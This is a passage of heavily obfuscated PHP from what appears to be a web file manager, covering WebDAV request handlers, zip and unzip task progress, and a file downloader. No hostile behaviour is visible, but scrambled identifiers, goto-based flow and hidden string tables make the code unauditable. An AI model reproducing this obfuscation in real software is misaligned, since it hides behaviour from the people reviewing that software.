"\x3c\x44\x3a\x6d\165\154\x74\151\163\x74\141\x74\x75\x73\40\170\155\154\x6e\163\x3a\x44\x3d\42\x44\101\x56\72\x22\x3e\12{$D¶ÇÂÒ­‰ì}\xa\x3c\x2f\104\x3a\x6d\165\x6c\164\151\163\164\141\x74\165\x73\x3e"); goto fÓ˜‘óÃÌÌ; Dˆ†¤½âø¯: if ($EÈµƒÃ±—) { $aÓƒÁ‘Ùº¤ = array($BÇ³ßç”à–); } else { $BÇ³ßç”à–[$F‰ô‚„ãÔß[28]] = $F‰ô‚„ãÔß[33]; $aÓƒÁ‘Ùº¤ = array_merge(array($BÇ³ßç”à–), $aÓƒÁ‘Ùº¤); } $D¶ÇÂÒ­‰ì = $F‰ô‚„ãÔß[33]; foreach ($aÓƒÁ‘Ùº¤ as $eˆ–¯¨ÍŒ) { $D¶ÇÂÒ­‰ì .= $this->parseItemXml($eˆ–¯¨ÍŒ, $EÈµƒÃ±—); } goto f±·‚ÉèÖğ; fÓ˜‘óÃÌÌ: } public function httpHEAD() { $cà£œ–“Ï =& $_SERVER[¼]; $bŠ¤ÇÑöÜ… = $this->pathInfo($this->path); if (!$bŠ¤ÇÑöÜ… || $bŠ¤ÇÑöÜ…[$cà£œ–“Ï[29]] == $cà£œ–“Ï[76]) { return array($cà£œ–“Ï[1025] => 200, $cà£œ–“Ï[1192] => array($cà£œ–“Ï[1765])); } return array($cà£œ–“Ï[1025] => 200, $cà£œ–“Ï[1192] => array($cà£œ–“Ï[1766], $cà£œ–“Ï[136], $cà£œ–“Ï[1767] . $bŠ¤ÇÑöÜ…[$cà£œ–“Ï[77]], $cà£œ–“Ï[1768] . get_file_mime($bŠ¤ÇÑöÜ…[$cà£œ–“Ï[157]]), $cà£œ–“Ï[132] . gmdate($cà£œ–“Ï[1754], $bŠ¤ÇÑöÜ…[$cà£œ–“Ï[1239]]) . $cà£œ–“Ï[1769], $cà£œ–“Ï[1770])); } public function httpOPTIONS() { $aŠ—ğƒ¡”å =& $_SERVER[¼]; return array($aŠ—ğƒ¡”å[1025] => 200, $aŠ—ğƒ¡”å[1192] => array($aŠ—ğƒ¡”å[1771], $aŠ—ğƒ¡”å[1772], $aŠ—ğƒ¡”å[1773], $aŠ—ğƒ¡”å[1248])); } public function httpPROPPATCH() { $FİâÁ¨’í =& $_SERVER[¼]; $a•Œ¬°ì— = $FİâÁ¨’í[1774] . $_SERVER[$FİâÁ¨’í[1355]] . $FİâÁ¨’í[1775]; return array($FİâÁ¨’í[1762] => 207, $FİâÁ¨’í[1763] => "\74\x44\x3a\155\165\154\164\151\x73\x74\x61\164\165\x73\x20\x78\155\x6c\156\x73\72\x44\x3d\42\104\x41\126\72\x22\x3e\12{$a•Œ¬°ì—}\12\74\57\x44\72\155\x75\x6c\164\151\163\164\141\x74\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Aê‘‡Åï—‚ =& $_SERVER[¼]; $a÷ˆé¢Ùˆ = $this->uploadFile(); if ($a÷ˆé¢Ùˆ) { $Eâˆë ·ÒÄ = 204; } else { $a÷ˆé¢Ùˆ = $Aê‘‡Åï—‚[33]; $Eâˆë ·ÒÄ = 201; } $Dƒ†íÍÔ˜¥ = $this->pathPut($this->path, $a÷ˆé¢Ùˆ); if ($Dƒ†íÍÔ˜¥ == !1) { $Eâˆë ·ÒÄ = 404; } return array($Aê‘‡Åï—‚[1762] => $Eâˆë ·ÒÄ); } private function uploadFile() { goto fÕŞÛ¢ã¥«; AÀÓê‚Ë·: $Bï¿õ—©Ü = @fopen($dÙÑãÌ•„, $B¹ğì¹ÃÑ„[1484]); $E¤¸ö‰Øæ = @fopen($B¹ğì¹ÃÑ„[1777], $B¹ğì¹ÃÑ„[1483]); if (!$E¤¸ö‰Øæ || !$Bï¿õ—©Ü) { @unlink($dÙÑãÌ•„); return !1; } goto Bî«¦ö’È«; fÕŞÛ¢ã¥«: $B¹ğì¹ÃÑ„ =& $_SERVER[¼]; @mk_dir(TEMP_FILES); $dÙÑãÌ•„ = TEMP_FILES . $B¹ğì¹ÃÑ„[1776] . rand_string(32); goto AÀÓê‚Ë·; e‹¥˜œÊÉˆ: if (@filesize($dÙÑãÌ•„) > 0) { return $dÙÑãÌ•„; } @unlink($dÙÑãÌ•„); return !1; goto d›Ä±±øİ‰; Bî«¦ö’È«: while (!feof($E¤¸ö‰Øæ)) { fwrite($Bï¿õ—©Ü, fread($E¤¸ö‰Øæ, 1024 * 200)); } fclose($E¤¸ö‰Øæ); fclose($Bï¿õ—©Ü); goto e‹¥˜œÊÉˆ; d›Ä±±øİ‰: } public function httpMKCOL() { $BŠÈéŒ×Ò =& $_SERVER[¼]; if ($this->pathExists($this->path)) { return array($BŠÈéŒ×Ò[1025] => 409); } $C­…ÓÎŞØª = $this->pathMkdir($this->path); return array($BŠÈéŒ×Ò[1025] => $C­…ÓÎŞØª ? 201 : 403); } public function httpMOVE() { $FŒ‹º‹µ™š =& $_SERVER[¼]; $cÀÔöâÃãê = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$FŒ‹º‹µ™š[1778]])) { $Cõ—˜¼ó¨ï[$FŒ‹º‹µ™š[1779]] = $_SERVER[$FŒ‹º‹µ™š[1778]] == $FŒ‹º‹µ™š[1780]; } $f¼¥åëÍÃÇ = $this->pathMove($this->path, $cÀÔöâÃãê); return array($FŒ‹º‹µ™š[1025] => $f¼¥åëÍÃÇ ? 201 : 404); } public function httpCOPY() { $B«âĞ°Ç¾ = $this->parsePath($this->pathGet(!0)); $f‡“ƒïÜÔˆ = $this->pathCopy($this->path, $B«âĞ°Ç¾); return array($_SERVER[¼][1025] => $f‡“ƒïÜÔˆ ? 201 : 404); } public function httpDELETE() { $AÆ…­–„å¸ = $this->pathRemove($this->path); return array($_SERVER[¼][1025] => $AÆ…­–„å¸ ? 200 : 503); } public function httpLOCK() { $d±ÊğñÛóÅ =& $_SERVER[¼]; $Fİ°íâ´í = md5($this->path); $B‹•¨ÅÚì = $d±ÊğñÛóÅ[1781] . $this->xmlGet($d±ÊğñÛóÅ[1782]) . $d±ÊğñÛóÅ[1783] . $Fİ°íâ´í . $d±ÊğñÛóÅ[1784]; return array($d±ÊğñÛóÅ[1025] => 200, $d±ÊğñÛóÅ[1192] => array($d±ÊğñÛóÅ[1785] . $Fİ°íâ´í, $d±ÊğñÛóÅ[1786]), $d±ÊğñÛóÅ[1787] => $B‹•¨ÅÚì); } public function httpUNLOCK() { return array($_SERVER[¼][1025] => 204); } public function xmlGet($B„²ÌŠ†îº) { goto AÈ†ßßù„°; Cï¦Œ™ãè: return $cîøŠÓëÚ²[33]; goto aöÙ°Ö×è½; AÈ†ßßù„°: $cîøŠÓëÚ² =& $_SERVER[¼]; static $fÃº‘“—­á = false; if (!$fÃº‘“—­á) { $FÅê‚‰èÕ³ = file_get_contents($cîøŠÓëÚ²[1788]); $fÃº‘“—­á = new DOMDocument(); $fÃº‘“—­á->loadXML($FÅê‚‰èÕ³); } goto eíùÉéªõÒ; eíùÉéªõÒ: $e–‘“ç†ÙÂ = array_shift(explode($cîøŠÓëÚ²[8], $B„²ÌŠ†îº)); $E—‘£Âœ†À = $fÃº‘“—­á->getElementsByTagNameNS($cîøŠÓëÚ²[1789], $e–‘“ç†ÙÂ); if ($E—‘£Âœ†À) { return $E—‘£Âœ†À[0]->nodeValue; } goto Cï¦Œ™ãè; aöÙ°Ö×è½: } public static function response($D„ÖÖÚÁ×„) { goto BÌÕÑ÷õ; cœÆª—–Ü·: $aô‹“ŒË¹‘[] = $b„ Óˆˆ½“[1729]; $aô‹“ŒË¹‘[] = $b„ Óˆˆ½“[1730]; foreach ($aô‹“ŒË¹‘ as $BÊ›ˆ…¬Š§) { header($BÊ›ˆ…¬Š§); } goto A§°æÏÅï‘; BÌÕÑ÷õ: $b„ Óˆˆ½“ =& $_SERVER[¼]; $aô‹“ŒË¹‘ = is_array($D„ÖÖÚÁ×„[$b„ Óˆˆ½“[1192]]) ? $D„ÖÖÚÁ×„[$b„ Óˆˆ½“[1192]] : array(); $aô‹“ŒË¹‘[] = HttpHeader::code($D„ÖÖÚÁ×„[$b„ Óˆˆ½“[1025]]); goto cœÆª—–Ü·; A§°æÏÅï‘: if (is_string($D„ÖÖÚÁ×„[$b„ Óˆˆ½“[1787]])) { header($b„ Óˆˆ½“[1790]); $fƒ¿ƒ„Üº = $b„ Óˆˆ½“[1791] . $b„ Óˆˆ½“[214] . $D„ÖÖÚÁ×„[$b„ Óˆˆ½“[1787]]; echo $fƒ¿ƒ„Üº; } goto Dª÷Ë¹±İ; Dª÷Ë¹±İ: } } goto Aì½Î¨á±Ñ; Eó“èÏ”²: define($_SERVER[¼][1899], 5); define($_SERVER[¼][1900], 16); define($_SERVER[¼][1901], 32); goto bÒÂâ¯º‘©; C‰¸†õ„ëŒ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fŠ´Ò²§ŠŸ; fŠ´Ò²§ŠŸ: $AÁÏœ£ãØ =& $_SERVER[¼]; parent::startAfter(); Hook::bind($AÁÏœ£ãØ[1469], array($this, $AÁÏœ£ãØ[1470])); goto fôÏí³ ŒŠ; fôÏí³ ŒŠ: Hook::bind($AÁÏœ£ãØ[1028], array($this, $AÁÏœ£ãØ[1471])); $FÇç…±ˆ·î =& $this->task; $FÇç…±ˆ·î[$AÁÏœ£ãØ[1472]] = $AÁÏœ£ãØ[1033]; goto d¹‹÷Ä´Üİ; d¹‹÷Ä´Üİ: if (!$FÇç…±ˆ·î[$AÁÏœ£ãØ[1312]]) { $FÇç…±ˆ·î[$AÁÏœ£ãØ[1312]] = LNG($AÁÏœ£ãØ[1473]); } goto AÊ»•¢±ô®; AÊ»•¢±ô®: } protected function endAfter() { $D¹äÇ“Ñ =& $_SERVER[¼]; parent::endAfter(); Hook::unbind($D¹äÇ“Ñ[1469], array($this, $D¹äÇ“Ñ[1470])); Hook::unbind($D¹äÇ“Ñ[1028], array($this, $D¹äÇ“Ñ[1471])); } public function updateAfter() { $D‚‹ÖìÙœ =& $_SERVER[¼]; $cˆ†Ç»š“ó =& $this->task; if (!$cˆ†Ç»š“ó[$D‚‹ÖìÙœ[971]] || !$cˆ†Ç»š“ó[$D‚‹ÖìÙœ[690]]) { return; } if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1472]] == $D‚‹ÖìÙœ[1033]) { $d³Îê¨çÄ = 0; if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1449]]) { $d³Îê¨çÄ = $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1450]] / $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1449]]; } $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]] = $d³Îê¨çÄ * 0.3; } else { if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1472]] == $D‚‹ÖìÙœ[298]) { $d³Îê¨çÄ = $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[983]] / $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[971]]; $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]] = 0.3 + $d³Îê¨çÄ * 0.4; } else { if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1472]] == $D‚‹ÖìÙœ[91]) { $E¹ÅİéØ§ = 0; if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1451]] == $D‚‹ÖìÙœ[91]) { $E¹ÅİéØ§ = $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1450]]; } $d³Îê¨çÄ = ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1454]] + $E¹ÅİéØ§) / $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[690]]; $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]] = 0.3 + 0.4 + $d³Îê¨çÄ * 0.3; } } } if ($cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]] > 0) { $AŞ¥Ô³„† = timeFloat() - $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1407]] - $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1410]]; $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1411]] = $AŞ¥Ô³„† * (1 - $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]]) / $cˆ†Ç»š“ó[$D‚‹ÖìÙœ[1405]]; } } public function addFile($E•¡Ù¯´²¨) { goto b—õÃ â¦¸; b—õÃ â¦¸: $e¦Ššà‡ =& $_SERVER[¼]; $Dï¦‚âğÖ¿ =& $this->task; $A¸Œ°µÃ = IO::info($E•¡Ù¯´²¨); goto e­÷ÌÊ‰Ô; BŒÜÇÇÑ­Î: $this->update(); goto dññí×£Ø½; bİƒŞƒìƒº: $Dï¦‚âğÖ¿[$e¦Ššà‡[973]] = $e¦Ššà‡[1462]; $Dï¦‚âğÖ¿[$e¦Ššà‡[1451]] = $e¦Ššà‡[1033]; $Dï¦‚âğÖ¿[$e¦Ššà‡[690]] = $A¸Œ°µÃ[$e¦Ššà‡[77]]; goto cªõÃÍ‘°; cªõÃÍ‘°: $Dï¦‚âğÖ¿[$e¦Ššà‡[971]] = 1; $DàÔºÕ…Ãù = 0; $Dï¦‚âğÖ¿[$e¦Ššà‡[1455]] = array($e¦Ššà‡[1456] => $DàÔºÕ…Ãù + 1, $e¦Ššà‡[383] => $A¸Œ°µÃ[$e¦Ššà‡[28]], $e¦Ššà‡[75] => $A¸Œ°µÃ[$e¦Ššà‡[75]], $e¦Ššà‡[462] => $A¸Œ°µÃ[$e¦Ššà‡[462]] ? $A¸Œ°µÃ[$e¦Ššà‡[462]] : $A¸Œ°µÃ[$e¦Ššà‡[75]]); goto BŒÜÇÇÑ­Î; e­÷ÌÊ‰Ô: $Dï¦‚âğÖ¿[$e¦Ššà‡[1447]] = $A¸Œ°µÃ[$e¦Ššà‡[28]]; $Dï¦‚âğÖ¿[$e¦Ššà‡[1449]] = $A¸Œ°µÃ[$e¦Ššà‡[77]]; $Dï¦‚âğÖ¿[$e¦Ššà‡[1450]] = 0; goto bİƒŞƒìƒº; dññí×£Ø½: } public function unzipAfter($A§´ˆÈá“) { goto aà¢ÀƒÖ÷‘; DùáÙá±…Ô: if ($cïÕ¨½¢æ[$b†…‡‹¸®[29]] == $b†…‡‹¸®[164]) { $bÀŒä‰Ù»[$b†…‡‹¸®[971]] = 1; } else { $bÀŒä‰Ù»[$b†…‡‹¸®[971]] = $cïÕ¨½¢æ[$b†…‡‹¸®[80]][$b†…‡‹¸®[78]]; } $bÀŒä‰Ù»[$b†…‡‹¸®[973]] = $b†…‡‹¸®[33]; $bÀŒä‰Ù»[$b†…‡‹¸®[1451]] = 0; goto E×«­Íƒ™; E×«­Íƒ™: $bÀŒä‰Ù»[$b†…‡‹¸®[983]] = 0; $bÀŒä‰Ù»[$b†…‡‹¸®[1449]] = 0; $bÀŒä‰Ù»[$b†…‡‹¸®[1450]] = 0; goto DÛš¸ìŠÈ£; eÕëß¡˜ÕÙ: $this->update(); self::log($b†…‡‹¸®[1474] . json_encode(array($bÀŒä‰Ù», $cïÕ¨½¢æ))); goto d¥£–­‘™æ; AÌäµÓ²íÃ: $cïÕ¨½¢æ = IO::infoWithChildren($A§´ˆÈá“); $eŒ Œ = 0; $bÀŒä‰Ù»[$b†…‡‹¸®[1455]] = array($b†…‡‹¸®[1456] => $eŒ Œ + 1, $b†…‡‹¸®[383] => $cïÕ¨½¢æ[$b†…‡‹¸®[28]], $b†…‡‹¸®[75] => $cïÕ¨½¢æ[$b†…‡‹¸®[75]], $b†…‡‹¸®[462] => $cïÕ¨½¢æ[$b†…‡‹¸®[462]] ? $cïÕ¨½¢æ[$b†…‡‹¸®[462]] : $cïÕ¨½¢æ[$b†…‡‹¸®[75]]); goto DùáÙá±…Ô; DÛš¸ìŠÈ£: $bÀŒä‰Ù»[$b†…‡‹¸®[1447]] = $b†…‡‹¸®[33]; $bÀŒä‰Ù»[$b†…‡‹¸®[1454]] = 0; $bÀŒä‰Ù»[$b†…‡‹¸®[690]] = $cïÕ¨½¢æ[$b†…‡‹¸®[77]]; goto eÕëß¡˜ÕÙ; aà¢ÀƒÖ÷‘: $b†…‡‹¸® =& $_SERVER[¼]; $bÀŒä‰Ù» =& $this->task; $bÀŒä‰Ù»[$b†…‡‹¸®[1472]] = $b†…‡‹¸®[91]; goto AÌäµÓ²íÃ; d¥£–­‘™æ: } public function nameParse($A©ÇØ›ÆôŠ) { goto FÃ‚ø£ŠÙ ; CÄ÷œè„è‡: $this->update(); goto DƒâÚ™ÍñÎ; dÉÁ¹ÖãÆª: $B²’Õ¸Š¬ = get_path_this($A©ÇØ›ÆôŠ); if (strstr($B²’Õ¸Š¬, $Dø—Š¥´²¶[93])) { $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[983]] += 1; $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[971]] += 1; } $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[1447]] = $A©ÇØ›ÆôŠ; goto CÄ÷œè„è‡; FÃ‚ø£ŠÙ : $Dø—Š¥´²¶ =& $_SERVER[¼]; $DŠ¿ºË“–Ï =& $this->task; if ($DŠ¿ºË“–Ï[$Dø—Š¥´²¶[1472]] == $Dø—Š¥´²¶[1033]) { $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[1472]] = $Dø—Š¥´²¶[298]; $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[1454]] = 0; $DŠ¿ºË“–Ï[$Dø—Š¥´²¶[690]] = 0; } goto dÉÁ¹ÖãÆª; DƒâÚ™ÍñÎ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $e…æÇÌ‚ë =& $_SERVER[¼]; parent::startAfter(); Hook::bind($e…æÇÌ‚ë[1475], array($this, $e…æÇÌ‚ë[1470])); $FÜ·ê×Ãâ¿ =& $this->task; $FÜ·ê×Ãâ¿[$e…æÇÌ‚ë[1472]] = $e…æÇÌ‚ë[1033]; if (!$FÜ·ê×Ãâ¿[$e…æÇÌ‚ë[1312]]) { $FÜ·ê×Ãâ¿[$e…æÇÌ‚ë[1312]] = LNG($e…æÇÌ‚ë[1476]); } } protected function endAfter() { $c‰œöæ¦Œ =& $_SERVER[¼]; parent::endAfter(); Hook::unbind($c‰œöæ¦Œ[1475], array($this, $c‰œöæ¦Œ[1470])); } public function updateAfter() { $B†„–—„…È =& $_SERVER[¼]; $c¸ç¹Äí„Ú =& $this->task; if (!$c¸ç¹Äí„Ú[$B†„–—„…È[971]] || !$c¸ç¹Äí„Ú[$B†„–—„…È[690]]) { return; } if ($c¸ç¹Äí„Ú[$B†„–—„…È[1472]] == $B†„–—„…È[1033]) { $e‡Ìˆíõã = $c¸ç¹Äí„Ú[$B†„–—„…È[1450]]; if ($c¸ç¹Äí„Ú[$B†„–—„…È[1451]] != $B†„–—„…È[1033]) { $e‡Ìˆíõã = 0; } $Cê‹ŠË¥‹¸ = ($c¸ç¹Äí„Ú[$B†„–—„…È[1454]] + $e‡Ìˆíõã) / $c¸ç¹Äí„Ú[$B†„–—„…È[690]]; $c¸ç¹Äí„Ú[$B†„–—„…È[1405]] = $Cê‹ŠË¥‹¸ * 0.3; } else { if ($c¸ç¹Äí„Ú[$B†„–—„…È[1472]] == $B†„–—„…È[298]) { $Cê‹ŠË¥‹¸ = $c¸ç¹Äí„Ú[$B†„–—„…È[983]] / $c¸ç¹Äí„Ú[$B†„–—„…È[971]]; $c¸ç¹Äí„Ú[$B†„–—„…È[1405]] = 0.3 + $Cê‹ŠË¥‹¸ * 0.5; } else { if ($c¸ç¹Äí„Ú[$B†„–—„…È[1472]] == $B†„–—„…È[91]) { $Cê‹ŠË¥‹¸ = 0; if ($c¸ç¹Äí„Ú[$B†„–—„…È[1449]]) { $Cê‹ŠË¥‹¸ = $c¸ç¹Äí„Ú[$B†„–—„…È[1450]] / $c¸ç¹Äí„Ú[$B†„–—„…È[1449]]; } $c¸ç¹Äí„Ú[$B†„–—„…È[1405]] = 0.3 + 0.5 + $Cê‹ŠË¥‹¸ * 0.2; } } } if ($c¸ç¹Äí„Ú[$B†„–—„…È[1405]] > 0) { $bŠ‘©Ğ•˜ = timeFloat() - $c¸ç¹Äí„Ú[$B†„–—„…È[1407]] - $c¸ç¹Äí„Ú[$B†„–—„…È[1410]]; $c¸ç¹Äí„Ú[$B†„–—„…È[1411]] = $bŠ‘©Ğ•˜ * (1 - $c¸ç¹Äí„Ú[$B†„–—„…È[1405]]) / $c¸ç¹Äí„Ú[$B†„–—„…È[1405]]; } } public function copyFileStart($C„¡´â‹ªØ, $DõŒó¢ø—º, $Aß¾î–Û, $BîÑĞáĞÕÂ, $B˜äæåˆ, $bÕ¾Š‚­­Á) { $CŞô³ÜºÒğ =& $_SERVER[¼]; parent::copyFileStart($C„¡´â‹ªØ, $DõŒó¢ø—º, $Aß¾î–Û, $BîÑĞáĞÕÂ, $B˜äæåˆ, $bÕ¾Š‚­­Á); $F¥«Õæí©º =& $this->task; if ($F¥«Õæí©º[$CŞô³ÜºÒğ[1472]] == $CŞô³ÜºÒğ[298]) { $F¥«Õæí©º[$CŞô³ÜºÒğ[1472]] = $CŞô³ÜºÒğ[91]; } $this->update(); } public function copyFileEnd($Fàò†Ş§†¬, $fİîŒ¬À‰†, $DÓà„Ã‹ÙŠ, $aÉ¥¨¥§ëœ, $cªÒ‘»Ö“ß, $dœ•°‘èÊŒ) { $Bò‚ŠÜè— =& $_SERVER[¼]; $Bº°° =& $this->task; $Bº°°[$Bò‚ŠÜè—[1450]] = $Bº°°[$Bò‚ŠÜè—[1449]]; $Bº°°[$Bò‚ŠÜè—[1454]] += $Bº°°[$Bò‚ŠÜè—[1449]]; $Bº°°[$Bò‚ŠÜè—[1451]] = $Bò‚ŠÜè—[33]; $this->update(); } public function nameParse($dŞ×ÊÎ¸ĞÂ) { $eŒİÍÓ¡ß =& $_SERVER[¼]; $eí¥ ëì½è =& $this->task; if ($eí¥ ëì½è[$eŒİÍÓ¡ß[983]] < $eí¥ ëì½è[$eŒİÍÓ¡ß[971]]) { $bÅçáò£¾Š = get_path_this($dŞ×ÊÎ¸ĞÂ); if (strstr($bÅçáò£¾Š, $eŒİÍÓ¡ß[93])) { $eí¥ ëì½è[$eŒİÍÓ¡ß[983]] += 1; } } if ($eí¥ ëì½è[$eŒİÍÓ¡ß[1472]] == $eŒİÍÓ¡ß[1033]) { $eí¥ ëì½è[$eŒİÍÓ¡ß[1472]] = $eŒİÍÓ¡ß[298]; } $eí¥ ëì½è[$eŒİÍÓ¡ß[1447]] = $dŞ×ÊÎ¸ĞÂ; $this->update(); } } class Downloader { static function start($eçÕ®ó“é„, $C÷íÛô×, $FÏœÕÖÀ• = 10) { goto b÷ÈŠ­ĞŒ»; dšÆ–œ»ö: $FœÎ—¨´ = intval($Cê»„Î®ï[$EåÃÕ‡íÄÜ[322]]); if (file_exists($fØÆÁÕ•Õ) && time() - filemtime($fØÆÁÕ•Õ) < 3) { return array($EåÃÕ‡íÄÜ[1025] => !1, $EåÃÕ‡íÄÜ[1027] => $EåÃÕ‡íÄÜ[1479]); } $Cˆ›ŠªÛšõ = array(); goto EÇ Ã§„â; c„Õñ­ñî²: if ($B‘Òâí…‘Ï[$EåÃÕ‡íÄÜ[1025]]) { @unlink($aÛÇ·î½¹ª); } return $B‘Òâí…‘Ï; goto cˆ¹¬–Å¹; d…º²Şóßİ: if ($f˜ÌõÓ«ÇÀ > $FœÎ—¨´) { @unlink($fØÆÁÕ•Õ); } file_put_contents($aÛÇ·î½¹ª, json_encode($Cˆ›ŠªÛšõ)); $B‘Òâí…‘Ï = self::fileDownloadCurl($eçÕ®ó“é„, $C÷íÛô×, !0, $f˜ÌõÓ«ÇÀ, $FœÎ—¨´); goto c„Õñ­ñî²; f§‰³–½á·: if (!$eçÕ®ó“é„) { return array($EåÃÕ‡íÄÜ[1025] => !1, $EåÃÕ‡íÄÜ[1027] => $EåÃÕ‡íÄÜ[1030]); } if (!$Cê»„Î®ï[$EåÃÕ‡íÄÜ[1274]] || $Cê»„Î®ï[$EåÃÕ‡íÄÜ[322]] == 0) { @unlink($fØÆÁÕ•Õ); @unlink($C÷íÛô×); $B‘Òâí…‘Ï = self::fileDownloadFopen($eçÕ®ó“é„, $C÷íÛô×, $Cê»„Î®ï[$EåÃÕ‡íÄÜ[322]]); if ($B‘Òâí…‘Ï[$EåÃÕ‡íÄÜ[1025]]) { return $B‘Òâí…‘Ï; } else { @unlink($fØÆÁÕ•Õ); @unlink($C÷íÛô×); $B‘Òâí…‘Ï = self::fileDownloadCurl($eçÕ®ó“é„, $C÷íÛô×, !1, 0, $Cê»„Î®ï[$EåÃÕ‡íÄÜ[322]]); @unlink($fØÆÁÕ•Õ); return $B‘Òâí…‘Ï; } } $f˜ÌõÓ«ÇÀ = is_file($fØÆÁÕ•Õ) ? filesize($fØÆÁÕ•Õ) : 0; goto dšÆ–œ»ö; FªÔÃÒ‚ÃÂ: $fØÆÁÕ•Õ = $C÷íÛô× . $EåÃÕ‡íÄÜ[1478]; if (is_array($eçÕ®ó“é„)) { $Cê»„Î®ï = $eçÕ®ó“é„; } else { $Cê»„Î®ï = url_header($eçÕ®ó“é„); } $eçÕ®ó“é„ = $Cê»„Î®ï[$EåÃÕ‡íÄÜ[292]]; goto f§‰³–½á·; b÷ÈŠ­ĞŒ»: $EåÃÕ‡íÄÜ =& $_SERVER[¼]; if (!request_url_safe($eçÕ®ó“é„)) { return array($EåÃÕ‡íÄÜ[1025] => !1, $EåÃÕ‡íÄÜ[1027] => $EåÃÕ‡íÄÜ[1030]); } $aÛÇ·î½¹ª = $C÷íÛô× . $EåÃÕ‡íÄÜ[1477]; goto FªÔÃÒ‚ÃÂ; EÇ Ã§„â: if (is_file($aÛÇ·î½¹ª)) { $dÚ¾«÷â¼â = file_get_contents($aÛÇ·î½¹ª); $Cˆ›ŠªÛšõ = json_decode($dÚ¾«÷â¼â, 1); } if (file_exists($C÷íÛô×) && $FœÎ—¨´ == filesize($C÷íÛô×)) { @unlink($fØÆÁÕ•Õ); @unlink($aÛÇ·î½¹ª); return array($EåÃÕ‡íÄÜ[1025] => !0, $EåÃÕ‡íÄÜ[1027] => $EåÃÕ‡íÄÜ[1480]); } if ($Cˆ›ŠªÛšõ[$EåÃÕ‡íÄÜ[322]] != $FœÎ—¨´) { $Cˆ›ŠªÛšõ = array($EåÃÕ‡íÄÜ[322] => $FœÎ—¨´); } goto d…º²Şóßİ; cˆ¹¬–Å¹: } static function fileDownloadFopen($câøáÛÁ”‘, $béõå…ñ®ó, $fšĞø‰È¾Û = 0) { $fâ¢º•¦± =& $_SERVER[¼]; @ini_set($fâ¢º•¦±[1481], $fâ¢º•¦±[1482]); $d‚ñ©…ÈŒè = $béõå…ñ®ó . $fâ¢º•¦±[1478]; set_timeout(); @unlink($d‚ñ©…ÈŒè); if ($Dˆó ºÍ¾ = @fopen($câøáÛÁ”‘, $fâ¢º•¦±[1483])) { goto eÆ‚›íë; eÆ‚›íë: if (!($D‚ƒ¸à’Ä— = @fopen($d‚ñ©…ÈŒè, $fâ¢º•¦±[1484]))) { return array($fâ¢º•¦±[1025] => !1, $fâ¢º•¦±[1027] => $fâ¢º•¦±[1485]); } while (!feof($Dˆó ºÍ¾)) { if (!file_exists($d‚ñ©…ÈŒè)) { fclose($D‚ƒ¸à’Ä—); return array($fâ¢º•¦±[1025] => !1, $fâ¢º•¦±[1027] => $fâ¢º•¦±[1486]); } clearstatcache(); if ($fšĞø‰È¾Û > 0 && $fšĞø‰È¾Û == filesize(iconv_system($d‚ñ©…ÈŒè))) { break; } fwrite($D‚ƒ¸à’Ä—, fread($Dˆó ºÍ¾, 1024 * 8), 1024 * 8); } fclose($D‚ƒ¸à’Ä—); goto F›­±Ë¢Ä; F›­±Ë¢Ä: fclose($Dˆó ºÍ¾); $DÔè×Ã»Áò = filesize(iconv_system($d‚ñ©…ÈŒè)); if ($fšĞø‰È¾Û != 0 && $DÔè×Ã»Áò != $fšĞø‰È¾Û) { return array($fâ¢º•¦±[1025] => !1, $fâ¢º•¦±[1027] => $fâ¢º•¦±[1487]); } goto D±¤ÛÜà¾à; D±¤ÛÜà¾à: self::checkGzip($d‚ñ©…ÈŒè); if (!@rename($d‚ñ©…ÈŒè, $béõå…ñ®ó)) { usleep(round(rand(0, 1000) * 50)); @unlink($béõå…ñ®ó); $d°¿…Ÿ¯Ô = @rename($d‚ñ©…ÈŒè, $béõå…ñ®ó); if (!$d°¿…Ÿ¯Ô) { return array($fâ¢º•¦±[1025] => !1, $fâ¢º•¦±[1027] => $fâ¢º•¦±[1488]); } } return array($fâ¢º•¦±[1025] => !0, $fâ¢º•¦±[1027] => $fâ¢º•¦±[688]); goto FŠ˜¹Õ—Ø…; FŠ˜¹Õ—Ø…: } else { return array($fâ¢º•¦±[1025] => !1, $fâ¢º•¦±[1027] => $fâ¢º•¦±[1489]); } } static function fileDownloadCurl($e­›Æí¨, $B³ÊÛ­ë°Ş, $eš…âßƒÖˆ = false, $dõÆ„”°¤— = 0, $fÁß³Ü÷ = 0) { goto e´Æ¢‰Íä‚; FïÏ„÷×¿×: curl_setopt($a ïòŞÛ÷ì, CURLOPT_NOPROGRESS, !1); curl_setopt($a ïòŞÛ÷ì, CURLOPT_PROGRESSFUNCTION, $BÌÑ¬îÖ[1491]); curl_progress_start($a ïòŞÛ÷ì); goto aªœùÂ›¡î; D§Š«š¶: $B†¯õº”»§ = @fopen($F©£¼ÒÉŸÉ, $BÌÑ¬îÖ[975]); if (!$B†¯õº”»§) { return array($BÌÑ¬îÖ[1025] => !1, $BÌÑ¬îÖ[1027] => $BÌÑ¬îÖ[1490]); } $a ïòŞÛ÷ì = curl_init($e­›Æí¨); 